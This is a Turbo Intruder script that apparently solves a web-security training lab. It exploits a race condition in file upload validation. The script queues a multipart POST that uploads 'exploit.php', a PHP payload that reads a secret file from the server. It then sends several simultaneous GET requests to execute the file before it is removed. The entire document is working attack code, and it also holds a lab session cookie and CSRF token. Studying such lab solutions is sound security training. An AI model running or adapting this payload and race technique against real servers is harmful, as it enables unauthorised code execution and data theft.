def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: 0a8500cf03be78fc8173703200ea007e.web-security-academy.net
Cookie: session=DwTwLuteI1oJcBsY5oeg8LsojIQkjNvP
Content-Length: 465
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDx4v5uCWVHn9TIA1

------WebKitFormBoundaryDx4v5uCWVHn9TIA1
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryDx4v5uCWVHn9TIA1
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryDx4v5uCWVHn9TIA1
Content-Disposition: form-data; name="csrf"

qnKkdgvpuxEGyUqUmvGuEqWea2CdIgl4
------WebKitFormBoundaryDx4v5uCWVHn9TIA1--

'''

    request2 = '''GET /files/avatars/exploit.php HTTP/2
Host: 0a8500cf03be78fc8173703200ea007e.web-security-academy.net
Cookie: session=DwTwLuteI1oJcBsY5oeg8LsojIQkjNvP

'''

    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)